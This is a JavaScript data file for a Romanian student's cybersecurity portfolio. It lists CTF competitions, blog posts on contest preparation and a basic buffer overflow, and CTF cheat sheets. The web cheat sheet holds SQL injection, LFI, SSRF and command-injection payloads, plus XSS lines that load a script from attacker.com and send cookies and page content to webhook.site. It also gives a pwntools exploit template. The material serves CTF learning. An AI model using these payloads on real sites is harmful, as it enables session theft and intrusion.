const portfolioData = {
    user: {
        name: "Cuciureanu Ioan (Juan0x1f)",
        classLevel: "Clasa a XI-a",
        description: "Pasionat de securitate cibernetică și tehnologie încă din copilărie, cu un accent puternic pe programare. Sunt mereu în căutare de noi provocări, îmi place să aprofundez concepte tehnice avansate și să dezvolt propriile mele tool-uri și programe.",
        username: "Juan0x1f",
        skills: ["Linux", "Python", "C++", "Bash", "WebSec", "Binary Exploitation"]
    },
    competitions: [
        {
            id: 1,
            title: "Olimpiada de Securitate Cibernetică (OSC)",
            date: "2026",
            description: "Mă pregătesc intens pentru etapa județeană (incoming!). Exersez provocări de tip CTF și tehnici avansate.",
            status: "Incoming ⏳",
            link: "https://osc.rocsc.ro/"
        },
        {
            id: 2,
            title: "UNbreakable România 2026 - Faza Suceava",
            date: "2026",
            description: "Participare la etapa județeană/regională. O experiență intensă de rezolvare a provocărilor CTF de diverse categorii.",
            status: "Locul 4 🏆",
            link: "https://unbreakable.ro/",
            images: ["assets/unbreakable1.jpg", "assets/unbreakable2.jpg"]
        },
        {
            id: 3,
            title: "RoCSC (Romanian Cyber Security Challenge)",
            date: "Recent",
            description: "Campioniatul național unde am rezolvat sarcini complexe de Web, Crypto și Pwn.",
            status: "Top 50-100",
            link: "#"
        },
        {
            id: 4,
            title: "UNbreakable România - Echipe",
            date: "Recent",
            description: "Participare în format de echipă. Oportunitate excelentă de colaborare și strategii comune.",
            status: "Top 50-100",
            link: "https://unbreakable.ro/"
        },
        {
            id: 5,
            title: "Vianu CTF",
            date: "Recent",
            description: "Unul din cele mai cunoscute concursuri CTF pentru liceeni. Focus puternic pe exerciții tehnice de tip Jeopardy.",
            status: "Top 50-100",
            link: "#"
        }
    ],
    blogPosts: [
        {
            id: 1,
            title: "Abordarea mea pentru OSC 2026",
            date: "15 Aprilie 2026",
            tag: "OSC",
            snippet: "Cum mă pregătesc pentru etapa județeană. Analiza regulamentului și strategii de bază...",
            content: `Salutare!\n\nRecent s-a publicat regulamentul pentru Olimpiada de Securitate Cibernetică (OSC) 2026, iar emoțiile încep să crească. Etapa județeană se apropie rapid și formatul este destul de intens: 6 ore de concurs continuu combinat cu exerciții de tip Jeopardy.\n\nCe fac pentru a mă pregăti?\nÎn primul rând, m-am focusat foarte mult pe provocările din anii trecuți de pe CyberEDU. Analizând arhiva, mi-am dat seama că trebuie să îmi cizelez rapid abilitățile de analiză de trafic (PCAP) și pe cele de Reverse Engineering. Timpul este limitat, deci automatizarea cu scripturi Python mă va salva enorm.\n\nScopul meu clar pentru această etapă este să mă calific printre primii și să prind un loc la Faza Națională. Wish me luck! Voi reveni cu un write-up post-concurs.`
        },
        {
            id: 2,
            title: "Basic Buffer Overflow (Pwn)",
            date: "02 Martie 2026",
            tag: "Pwn",
            snippet: "Un ghid introductiv despre cum poți exploata vulnerabilități de buffer overflow pe o arhitectură pe 32-biți.",
            content: `Vulnerabilitatea de tip Buffer Overflow apare atunci când un program scrie mai multe date într-un buffer (o zonă temporară de memorie) decât acesta poate stoca. Acest lucru provoacă suprascrierea memoriei adiacente, care, de regulă, conține adresa de retur a funcției curente.\n\nExemplu Clasic (32-bit):\nDacă ai un program C vulnerabil care folosește funcția 'gets()', poți trimite un număr mare de caractere ('A'-uri) până când suprascrii registrul EIP (Instruction Pointer). Odată ce controlezi EIP-ul, controlezi execuția programului!\n\nPass 1: Găsirea Offset-ului\nFolosind utilitarul 'pattern create' din GDB, putem trimite un string unic (ex: 200 caractere). Programul va crăpa (Segmentation Fault) la o anumită adresă. Folosim acea adresă cu 'pattern offset' pentru a afla fix câte caractere ne trebuie ca să ajungem la EIP.\n\nPass 2: Execuția\nÎn loc de 'A'-uri peste EIP, punem adresa unei funcții ascunse (ex. win_function) sau un shellcode. Bingo! Am obținut un shell.`
        },
        {
            id: 3,
            title: "Cum să te apuci de CTF-uri",
            date: "10 Ianuarie 2026",
            tag: "Ghid",
            snippet: "Platforme recomandate, metodologie de învățare și tool-uri pe care orice începător ar trebui să le cunoască.",
            content: `Primesc des întrebarea: "Cum mă apuc de securitate și CTF-uri?"\n\nRăspunsul este simplu: practică, practică și iar practică!\n1. Baze solide: Înainte să "spargi" ceva, trebuie să înțelegi cum funcționează. Învață concepte de rețelistică (TCP/IP), puțină programare (Python, C) și cum să folosești Linux-ul din linia de comandă.\n2. Exersează pe platforme gratuite: Recomand călduros PicoCTF pentru începători. Exercițiile de acolo sunt foarte blânde și explică concepte de bază.\n3. Joacă local: Instalează-ți un Kali Linux într-o mașină virtuală, învață să folosești tool-uri precum Nmap, BurpSuite, Wireshark, Ghidra.\n4. Muncește în echipă: Cele mai mari salturi de învățare le-am avut discutând provocări cu alți pasionați. Intră pe servere de Discord, participă la evenimente ca UNbreakable România și prinde curaj.\n\nNu te lăsa bătut! La primele CTF-uri probabil vei sta 5 ore și nu vei face nici un punct. Este ceva perfect normal. Singura cale de a deveni "hacker" bun este reziliența.`
        }
    ],
    tipsTricks: [
        {
            id: 1,
            title: "Tehnici WEB",
            category: "Web",
            description: "Noțiuni esențiale pentru exploatarea aplicațiilor web: Recon, SQLi, LFI, XSS și multe altele.",
            content: `Recon rapid:
view-source:
robots.txt
sitemap.xml
/.git/
/.env

DevTools:
- Network → vezi request-uri
- Application → cookies, localStorage

Directory brute:
gobuster dir -u http://site.com -w common.txt

Param fuzz:
ffuf -u http://site.com/index.php?FUZZ=test -w params.txt

SQLi:
' OR 1=1--
" OR "1"="1
sqlmap -u "http://site.com?id=1" --dbs

LFI:
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php

SSRF:
http://127.0.0.1
http://169.254.169.254/latest/meta-data/

Command Injection:
;id
| whoami
|| cat flag.txt

XSS FULL
Basic:
<script>alert(1)</script>

Bypass:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>

Blind:
<script src="https://attacker.com/x.js"></script>

Exfil:
<script>fetch('https://webhook.site/?c='+document.cookie)</script>
<script>fetch('https://webhook.site/?d='+btoa(document.body.innerHTML))</script>`,
        },
        {
            id: 2,
            title: "PCAP / TRAFFIC ANALYSIS",
            category: "PCAP",
            description: "Analiza traficului de rețea. Extragere credențiale, urmarire fluxuri TCP și analiză Wireshark/tshark.",
            content: `tshark -r file.pcap
tshark -r file.pcap -Y "http"
tshark -r file.pcap -Y "dns"
tshark -r file.pcap -Y "ftp"

Extract creds:
tshark -r file.pcap -Y "http.request.method == POST"

Follow stream:
Wireshark → Follow TCP Stream

Export files:
File → Export Objects → HTTP

Search flag:
strings file.pcap | grep -i flag

DNS exfil:
tshark -r file.pcap -Y "dns" | grep TXT`,
        },
        {
            id: 3,
            title: "Flux de lucru PWN",
            category: "Pwn",
            description: "Ghid pas cu pas pentru abordarea provocărilor de tip Pwn/Binary Exploitation.",
            content: `file chall
checksec chall
gdb ./chall
run
disas main
pattern create 200
pattern offset VALUE

Exploit:
from pwn import *
p = remote("IP", PORT)
payload = b"A"*offset + p64(addr)
p.sendline(payload)
p.interactive()

ROP:
ROPgadget --binary chall
one_gadget libc.so.6`,
        },
        {
            id: 4,
            title: "Comenzi rapide STEGO",
            category: "Stego",
            description: "Extragere de date ascunse în fișiere, imagini și grafice audio (Steganography).",
            content: `file img.jpg
strings img.jpg
exiftool img.jpg
binwalk -e img.jpg
steghide extract -sf img.jpg
zsteg img.png
xxd file | tail

Audio:
audacity → spectrogram`,
        },
        {
            id: 5,
            title: "Analiză FORENSICS",
            category: "Forensics",
            description: "Metodologii pentru analiza sistemelor de operare compromise și dump-uri de memorie folosind Volatility.",
            content: `file dump
strings dump
binwalk dump
mount -o loop disk.img /mnt

Volatility:
volatility -f dump.raw imageinfo
volatility -f dump.raw --profile=Win7SP1x64 pslist
volatility -f dump.raw filescan
volatility -f dump.raw dumpfiles`,
        },
        {
            id: 6,
            title: "Ghid CRYPTO",
            category: "Crypto",
            description: "Metode și decodificări rapide pentru probleme de Cryptography, XOR, RSA și formatări clasice.",
            content: `base64 -d file
xxd -r -p file
CyberChef → Magic

XOR brute:
for k in range(256):
print(bytes([b ^ k for b in data]))

openssl enc -d -aes-256-cbc -in file

RSA:
factordb.com
Wiener attack
Hastad attack`,
        }
    ],
    categories: ["Toate", "Web", "PCAP", "Pwn", "Stego", "Forensics", "Crypto"]
};
